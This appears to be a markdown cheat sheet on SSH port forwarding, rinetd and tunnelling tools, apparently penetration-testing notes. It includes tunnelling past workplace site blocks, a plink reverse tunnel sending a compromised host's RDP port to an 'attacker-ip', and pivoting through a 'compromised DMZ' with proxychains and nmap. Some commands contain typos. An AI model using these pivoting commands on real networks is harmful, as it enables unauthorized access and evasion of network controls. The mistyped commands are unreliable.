> References:
- https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/
- http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html
- https://blog.trackets.com/2014/05/17/ssh-tunnel-local-and-remote-port-forwarding-explained-with-examples.html

# Pending References:
- https://vimeo.com/54505525

# Local Port Forwarding

```
ssh -L <local-port-to-listen>:<remote-host>:<remote-port> <gateway>
```

### Allow connections to a specific blocked server.

From work:
```
ssh -L 9001:banned-site.com:80 user@home
curl http://localhost:9001
```

Says we’re forwarding our local port 9001 to banned-site.com:80, through the gateway `home` (port 22).

![](https://chamibuddhika.files.wordpress.com/2012/03/localportforwarding.jpg)

```
ssh -L 9001:banned:22 user@home
ssh -p 9001 localhost
```

![](https://chamibuddhika.files.wordpress.com/2012/03/sshsessionforwarding.jpg)

Allow remote connections to local port forwards (listening on all interfaces)
```
ssh -L 9001:banned:22 user@home -g
ssh -p 9001 work_machine    #Remotely
```

### Access a port on your server which can only be accessed from localhost and not remotely.

From local machine:
```
ssh -L 9000:localhost:5432 user@server
psql -h localhost -p 9000
```

Server acts as the gateway and binds server's port 5432 to local port 9000.

# Remote Port Forwarding

### Allow remote access to restricted network.

From work:
```
ssh -R 9001:intra-ssh-server:22 user@home
```
Server will bind port 9001 on `home` machine to listen for incoming requests which would subsequently be routed through the created SSH channel. Connecting to `localhost:9001` in `home` will forward user to intra:22

From home:
```
ssh -p 9001 localhost
```

![](https://chamibuddhika.files.wordpress.com/2012/03/remoteportforwarding.jpg)

Add `GatewayPorts yes` to `sshd_config` to listening on all interfaces.

### Allow public access to a local resource through a public server.

```
ssh -R 9000:localhost:3000 user@public_sever
```
```
sudo vim /etc/ssh/sshd_config
GatewayPorts yes
sudo service ssh restart
```

# Dynamic port forwarding

One local port for tunneling data to all remote destinations (SOCKS protocol)

From work:
```
ssh -D 9001 home
```

![](https://chamibuddhika.files.wordpress.com/2012/03/dynamicportforwarding.jpg)

# Tips
Monitoring Tunnels
```
netstat -tunelp
```

Avoid TTL
```
-nNT
```

# rinetd

When outbound only 80 / 443 use port forwarding
```
nano /etc/rinetd.conf
ip1 80 ip2 3389
```
```
bindaddress bindport connectaddress connectport
```  

(ip1:80 will proxy for ip2:3389)

# Creating reverse SSH client to tunnel-out remote desktop port

Creating Tunnel


FROM remote non routable machine
```
pling -l root -pw password attacker-ip -R 3390:127.0.0.1:3389  
```
> localhost 3389 to attacker ip 3389

FROM attacker's machine
```
rdesktop localhost:3390
```

# SSH Dynamic Port Forwarding (compromised DMZ used to scan internal IPs)

Create local SOCS4 proxy:

From attacker's machine (compromised DMZ)
```
ssh -D 8080 root@DMZ-IP

netstat -antp | grep 8080

/etc/proxychains.conf
socks4 127.0.0.1 8080
proxychains nmap -p 3389 -ST -Pn non-routable-remote-ip-range --oepn

proxychains rdesktop rdp-ip-in-non-routable-range
```

# Tools
- XFLTReaT tunnelling framework: https://github.com/earthquake/XFLTReaT
```
TCP
UDP
ICMP
SOCKS v4, 4a, 5
HTTP CONNECT
SCTP (by Darren Martyn @info_dox)
WebSocket
DNS (A/CNAME, PRIVATE, NULL) - Proof of Concept
RDP (Windows only)
```
